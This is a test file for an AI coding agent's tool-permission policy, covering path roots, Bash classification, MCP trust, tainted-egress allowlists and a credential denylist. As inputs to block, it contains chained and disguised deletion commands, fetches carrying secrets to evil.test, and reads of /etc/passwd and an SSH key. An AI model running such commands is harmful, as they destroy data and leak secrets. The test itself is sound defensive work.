import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ToolGrant } from "@homerun/core";
import { canonicalPath, decide, insideRoots, resolveRoots, type PolicyContext } from "../../src/agent/policy";

const dir = canonicalPath(mkdtempSync(join(tmpdir(), "hr-policy-")));
const root = join(dir, "proj");
mkdirSync(join(root, "src"), { recursive: true });
symlinkSync(dir, join(root, "escape"));
afterAll(() => rmSync(dir, { recursive: true, force: true }));

const grant = (g: Partial<ToolGrant> & Pick<ToolGrant, "tool" | "pattern" | "class">): ToolGrant => ({
  grant_id: `g-${g.tool}-${g.pattern}`,
  task_id: "t1",
  granted_by: "d1",
  granted_at: 1,
  revoked_at: null,
  ...g,
}) as ToolGrant;

function ctx(over: Partial<PolicyContext> = {}): PolicyContext {
  return {
    spec: {
      builtin: ["Read", "Glob", "Write", "Edit", "Bash", "WebFetch", "WebSearch", "AskUserQuestion"],
      mcpServers: ["fixture"],
      bashPatterns: [
        { pattern: "git status*", class: "read" },
        { pattern: "npm test*", class: "write" },
        { pattern: "curl *", class: "network" },
        { pattern: "rm *", class: "destructive" },
      ],
    },
    roots: [root],
    cwd: root,
    egress: { mode: "allowlist", domains: ["docs.example.com", "*.api.example.com"] },
    grants: [],
    tainted: false,
    authority: "full",
    grantsAllowed: true,
    denylist: { homes: [join(dir, "home")], dataDir: join(dir, "data"), workspacesDir: join(dir, "data", "workspaces"), claudeConfigDir: join(dir, "data", "claude-config"), tmpDir: join(dir, "data", "tmp"), caseInsensitive: false },
    sessionId: null,
    shellDialect: "bash",
    ...over,
  };
}

describe("roots (§5.5)", () => {
  test("inside is decided on canonical paths: symlinks resolved, missing tails kept", () => {
    expect(insideRoots([root], join(root, "src", "new", "file.ts"))).toBe(true);
    expect(insideRoots([root], join(root, "..", "other"))).toBe(false);
    expect(insideRoots([root], join(root, "escape", "x"))).toBe(false);
    expect(insideRoots([root], root)).toBe(true);
    expect(insideRoots([root], root + "-sibling/x")).toBe(false);
    expect(resolveRoots(["~/proj"], dir, "/nowhere")).toEqual([root]);
    expect(resolveRoots([], dir, root)).toEqual([root]);
  });
});

describe("tool policy (§5.5, §5.6)", () => {
  test("out-of-spec tools are denied", () => {
    expect(decide(ctx({ spec: { builtin: ["Read"], mcpServers: [], bashPatterns: [] } }), "Write", {})).toMatchObject({ policy: "denied", allow: false });
    expect(decide(ctx(), "mcp__other__x", {})).toMatchObject({ policy: "denied", allow: false });
  });

  test("reads are allowed; outside the roots they taint the run", () => {
    expect(decide(ctx(), "Read", { file_path: join(root, "a") })).toMatchObject({ policy: "allowed", allow: true, taints: false });
    expect(decide(ctx(), "Read", { file_path: "/etc/hosts" })).toMatchObject({ policy: "allowed", allow: true, taints: true });
    expect(decide(ctx(), "Glob", { pattern: "*" })).toMatchObject({ allow: true, taints: false });
    expect(decide(ctx({ egress: { mode: "open" } }), "Read", { file_path: "/etc/hosts" })).toMatchObject({ allow: true, taints: false });
    expect(decide(ctx(), "AskUserQuestion", { questions: [] })).toMatchObject({ policy: "allowed", toolClass: "read" });
  });

  test("writes: inside the roots allowed, outside need approval without always", () => {
    expect(decide(ctx(), "Write", { file_path: join(root, "src/x.ts") })).toMatchObject({ policy: "allowed", toolClass: "write" });
    expect(decide(ctx(), "Edit", { file_path: "src/x.ts" })).toMatchObject({ policy: "allowed" });
    expect(decide(ctx(), "Write", { file_path: join(root, "escape/x") })).toMatchObject({
      policy: "needs_approval",
      approval: { reason: "not_allowlisted", offerAlways: false },
    });
  });

  test("Bash: declared patterns classify; metacharacters and destructive patterns ask each time", () => {
    expect(decide(ctx(), "Bash", { command: "git status --short" })).toMatchObject({ policy: "allowed", toolClass: "read" });
    expect(decide(ctx(), "Bash", { command: "npm test" })).toMatchObject({ policy: "allowed", toolClass: "write" });
    expect(decide(ctx(), "Bash", { command: "git status; rm -rf x" })).toMatchObject({ approval: { reason: "destructive", offerAlways: false } });
    expect(decide(ctx(), "Bash", { command: "rm -rf build" })).toMatchObject({ toolClass: "destructive", approval: { reason: "destructive", offerAlways: false } });
  });

  test("Bash: an unmatched command offers an exact-command grant; a grant then covers it", () => {
    expect(decide(ctx(), "Bash", { command: "npm install left-pad" })).toMatchObject({
      policy: "needs_approval",
      toolClass: "destructive",
      approval: { reason: "not_allowlisted", offerAlways: true, suggestedGrant: { tool: "Bash", pattern: "npm install left-pad", class: "write" } },
    });
    expect(decide(ctx(), "Bash", { command: "ls *.log" }).approval).toMatchObject({ offerAlways: false });
    expect(decide(ctx({ grantsAllowed: false }), "Bash", { command: "ls" }).approval).toEqual({ reason: "not_allowlisted", offerAlways: false });
    const g = grant({ tool: "Bash", pattern: "npm install *", class: "write" });
    expect(decide(ctx({ grants: [g] }), "Bash", { command: "npm install left-pad" })).toMatchObject({ policy: "granted", allow: true, toolClass: "write", grantId: g.grant_id });
    expect(decide(ctx({ grants: [{ ...g, revoked_at: 5 }] }), "Bash", { command: "npm install left-pad" }).policy).toBe("needs_approval");
    // A declared destructive pattern wins over a grant.
    const rm = grant({ tool: "Bash", pattern: "rm *", class: "write" });
    expect(decide(ctx({ grants: [rm] }), "Bash", { command: "rm x" }).approval?.reason).toBe("destructive");
  });

  test("Bash in a shell dialect the classifier doesn't read: always destructive, no pattern, grant or 'Always'", () => {
    const g = grant({ tool: "Bash", pattern: "npm install *", class: "write" });
    const u = ctx({ shellDialect: "unknown", grants: [g] });
    // Bash-syntax patterns and grants would read these PowerShell and cmd commands as harmless.
    for (const command of ["git status (Remove-Item -Recurse C:\\x)", "git status $(ri x)", "npm install @(rd /s /q x)", "npm install left-pad", "git status %COMSPEC%", "git status"]) {
      const d = decide(u, "Bash", { command });
      expect(d).toMatchObject({ policy: "needs_approval", allow: false, toolClass: "destructive", approval: { reason: "destructive", offerAlways: false } });
      expect(d.approval?.suggestedGrant).toBeUndefined();
      expect(d.grantId).toBeUndefined();
    }
    // The same calls in bash are classified as before.
    expect(decide(ctx({ grants: [g] }), "Bash", { command: "npm install left-pad" }).policy).toBe("granted");
    expect(decide(ctx(), "Bash", { command: "git status" }).policy).toBe("allowed");
  });

  test("claude's Windows PowerShell tool is never a task's tool: denied, whatever the grants", () => {
    const g = grant({ tool: "Bash", pattern: "git status*", class: "read" });
    for (const dialect of ["bash", "unknown"] as const) {
      const d = decide(ctx({ shellDialect: dialect, grants: [g] }), "PowerShell", { command: "git status" });
      expect(d).toMatchObject({ policy: "denied", allow: false, toolClass: "destructive" });
    }
  });

  test("MCP: untrusted until 'Trust this tool'; its output taints", () => {
    expect(decide(ctx(), "mcp__fixture__lookup", {})).toMatchObject({
      policy: "needs_approval",
      mcpServer: "fixture",
      taints: true,
      approval: { reason: "untrusted_tool", offerAlways: true, suggestedGrant: { tool: "mcp__fixture__lookup", pattern: null } },
    });
    const g = grant({ tool: "mcp__fixture__lookup", pattern: null, class: "read" });
    expect(decide(ctx({ grants: [g] }), "mcp__fixture__lookup", {})).toMatchObject({ policy: "granted", toolClass: "read", taints: true });
    expect(decide(ctx({ grants: [g] }), "mcp__fixture__other", {}).policy).toBe("needs_approval");
  });

  test("network: free until tainted, then only to allowlisted domains", () => {
    expect(decide(ctx(), "WebFetch", { url: "https://evil.test/x" })).toMatchObject({ policy: "allowed", taints: true });
    const t = ctx({ tainted: true });
    expect(decide(t, "WebFetch", { url: "https://docs.example.com/a" }).policy).toBe("allowed");
    expect(decide(t, "WebFetch", { url: "https://v1.api.example.com/a" }).policy).toBe("allowed");
    expect(decide(t, "WebFetch", { url: "https://api.example.com/a" }).policy).toBe("needs_approval");
    expect(decide(t, "WebFetch", { url: "https://evil.test/x?secret=1" })).toMatchObject({
      approval: { reason: "tainted_egress", offerAlways: true, url: "https://evil.test/x?secret=1", suggestedGrant: { tool: "WebFetch", pattern: "evil.test", class: "network" } },
    });
    expect(decide(t, "WebFetch", { url: "file:///etc/passwd" }).approval).toMatchObject({ reason: "tainted_egress", offerAlways: false });
    const g = grant({ tool: "WebFetch", pattern: "evil.test", class: "network" });
    expect(decide({ ...t, grants: [g] }, "WebFetch", { url: "https://evil.test/y" })).toMatchObject({ policy: "granted", grantId: g.grant_id });
    expect(decide(t, "WebSearch", { query: "x" }).approval).toMatchObject({ reason: "tainted_egress", offerAlways: false });
    expect(decide(t, "Bash", { command: "curl https://evil.test" }).approval).toMatchObject({ reason: "tainted_egress", offerAlways: false });
    expect(decide({ ...t, egress: { mode: "open" } }, "WebFetch", { url: "https://evil.test/x" })).toMatchObject({ policy: "allowed", taints: false });
  });

  test("a tainted fetch offers both the domain and every domain; neither in a chat", () => {
    const t = ctx({ tainted: true });
    expect(decide(t, "WebFetch", { url: "https://evil.test/x?secret=1" }).approval).toEqual({
      reason: "tainted_egress",
      offerAlways: true,
      url: "https://evil.test/x?secret=1",
      suggestedGrant: { tool: "WebFetch", pattern: "evil.test", class: "network" },
      suggestedGrantAll: { tool: "WebFetch", pattern: "*", class: "network" },
    });
    expect(decide({ ...t, grantsAllowed: false }, "WebFetch", { url: "https://evil.test/x" }).approval).toEqual({ reason: "tainted_egress", offerAlways: false, url: "https://evil.test/x" });
    // Neither where the call isn't a fetch to a host name an all-domains grant would cover.
    expect(decide(t, "WebFetch", { url: "file:///etc/passwd" }).approval).toEqual({ reason: "tainted_egress", offerAlways: false, url: "file:///etc/passwd" });
    expect(decide(t, "WebFetch", { url: "http://[::1]/" }).approval).toMatchObject({ offerAlways: false });
    expect(decide(t, "WebFetch", { url: "http://[::1]/" }).approval?.suggestedGrantAll).toBeUndefined();
    const ip = decide(t, "WebFetch", { url: "http://203.0.113.7/x" }).approval;
    expect(ip).toMatchObject({ offerAlways: true, suggestedGrant: { pattern: "203.0.113.7" } });
    expect(ip?.suggestedGrantAll).toBeUndefined();
    expect(decide(t, "WebFetch", { url: "http://localhost:8080/" }).approval?.suggestedGrantAll).toBeUndefined();
    // WebSearch, Bash and MCP are unchanged.
    for (const [tool, input] of [["WebSearch", { query: "x" }], ["Bash", { command: "curl https://evil.test" }], ["mcp__fixture__lookup", {}]] as const)
      expect(decide(t, tool, input).approval?.suggestedGrantAll).toBeUndefined();
  });

  test("web_read_only offers neither choice (§9.9)", () => {
    const w = ctx({ authority: "web_read_only", tainted: true });
    expect(decide(w, "WebFetch", { url: "https://evil.test/x" })).toMatchObject({ policy: "needs_approval", approval: { reason: "web_read_only", offerAlways: false } });
    expect(decide(w, "WebFetch", { url: "https://evil.test/x" }).approval).toEqual({ reason: "web_read_only", offerAlways: false, url: "https://evil.test/x" });
  });

  test("an all-domains grant covers a fetch to any host name, and only WebFetch", () => {
    const all = grant({ tool: "WebFetch", pattern: "*", class: "network" });
    const t = ctx({ tainted: true, grants: [all] });
    for (const url of ["https://evil.test/x?secret=1", "http://a.b.c.example.org/", "https://xn--bcher-kva.de/"])
      expect(decide(t, "WebFetch", { url })).toMatchObject({ policy: "granted", allow: true, grantId: all.grant_id, taints: true });
    // Not what a wildcard would not cover either: non-http(s), IP literals, loopback names.
    for (const url of ["file:///etc/passwd", "ftp://evil.test/", "http://127.0.0.1/", "http://[::1]/", "http://localhost/"])
      expect(decide(t, "WebFetch", { url }).policy).toBe("needs_approval");
    expect(decide(t, "WebSearch", { query: "x" }).policy).toBe("needs_approval");
    expect(decide(t, "Bash", { command: "curl https://evil.test" }).policy).toBe("needs_approval");
    expect(decide(t, "mcp__fixture__lookup", {}).policy).toBe("needs_approval");
    // Untainted, a fetch is plainly allowed: the grant isn't needed.
    expect(decide(ctx({ grants: [all] }), "WebFetch", { url: "https://evil.test/" }).policy).toBe("allowed");
  });

  test("an all-domains grant doesn't lift web_read_only or the denylist (§9.9, §13)", () => {
    const all = grant({ tool: "WebFetch", pattern: "*", class: "network" });
    expect(decide(ctx({ tainted: true, grants: [all], authority: "web_read_only" }), "WebFetch", { url: "https://evil.test/" }).approval?.reason).toBe("web_read_only");
    const t = ctx({ tainted: true, grants: [all] });
    const key = join(dir, "home", ".ssh", "id_ed25519");
    expect(decide(t, "Read", { file_path: key })).toMatchObject({ policy: "denied", allow: false });
    expect(decide(t, "WebFetch", { url: `file://${key}` })).toMatchObject({ policy: "needs_approval", approval: { offerAlways: false } });
  });

  test("revoking the all-domains grant brings the prompt back", () => {
    const all = grant({ tool: "WebFetch", pattern: "*", class: "network" });
    expect(decide(ctx({ tainted: true, grants: [all] }), "WebFetch", { url: "https://evil.test/" }).policy).toBe("granted");
    const revoked = { ...all, revoked_at: 2 };
    expect(decide(ctx({ tainted: true, grants: [revoked] }), "WebFetch", { url: "https://evil.test/" })).toMatchObject({
      policy: "needs_approval",
      approval: { reason: "tainted_egress", suggestedGrantAll: { tool: "WebFetch", pattern: "*", class: "network" } },
    });
  });

  test("web_read_only (§9.9): only read-class calls run; grants do not lift it", () => {
    const w = ctx({ authority: "web_read_only" });
    expect(decide(w, "Read", { file_path: join(root, "a") }).policy).toBe("allowed");
    expect(decide(w, "Bash", { command: "git status" }).policy).toBe("allowed");
    expect(decide(w, "Write", { file_path: join(root, "a") })).toMatchObject({ policy: "needs_approval", approval: { reason: "web_read_only", offerAlways: false } });
    expect(decide(w, "WebFetch", { url: "https://docs.example.com/" }).approval).toEqual({ reason: "web_read_only", offerAlways: false, url: "https://docs.example.com/" });
    const g = grant({ tool: "Bash", pattern: "npm install *", class: "write" });
    expect(decide({ ...w, grants: [g] }, "Bash", { command: "npm install x" }).approval?.reason).toBe("web_read_only");
    expect(decide(w, "Bash", { command: "ls" }).approval).toEqual({ reason: "web_read_only", offerAlways: false });
  });
});
